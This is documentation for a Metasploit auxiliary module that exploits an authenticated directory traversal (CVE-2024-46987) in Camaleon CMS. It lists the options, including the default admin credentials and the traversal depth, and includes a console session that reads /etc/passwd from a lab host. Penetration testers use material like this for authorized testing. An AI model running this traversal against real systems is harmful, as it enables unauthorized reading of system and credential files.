## Vulnerable Application

This module attempts to read files from an authenticated directory traversal vuln in Camaleon CMS versions >= 2.8.0 and version 2.9.0

CVE-2024-46987 mistakenly indicates that versions 2.8.1 and 2.8.2 are also vulnerable, however this is not the case.

## Verification Steps

1. Do: `use auxiliary/gather/camaleon_traversal`
2. Do: `set RHOSTS [IP]`
3. Do: `run`

## Options

### username

Valid username. The Camaleon CMS default is "admin".

### password

Valid password. The Camaleon CMS default is "admin123".

### filepath

The filepath of the file to read.

### depth

The number of "../" appended to the filename. Default is 13

### vhost

Target virtual host/domain name. Ex: target.com

### verbose

Get verbose output.

### store_loot

If true, the target file is stored as loot.

Otherwise, the file is printed to stdout.

## Scenarios

```
msf > use auxiliary/gather/camaleon_traversal 
msf auxiliary(gather/camaleon_traversal) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf auxiliary(gather/camaleon_traversal) > set rhost 10.0.0.45
rhost => 10.0.0.45
msf auxiliary(gather/camaleon_traversal) > set rport 3000
rport => 3000
msf auxiliary(gather/camaleon_traversal) > set username test
username => test
msf auxiliary(gather/camaleon_traversal) > set password password
password => password
msf auxiliary(gather/camaleon_traversal) > set autocheck false
autocheck => false
msf auxiliary(gather/camaleon_traversal) > run
[*] Running module against 10.0.0.45
[!] AutoCheck is disabled, proceeding with exploitation
[+] /etc/passwd stored as '/home/kali/.msf4/loot/20260314231930_default_unknown_camaleon.travers_470222.txt'
[*] Auxiliary module execution completed
```
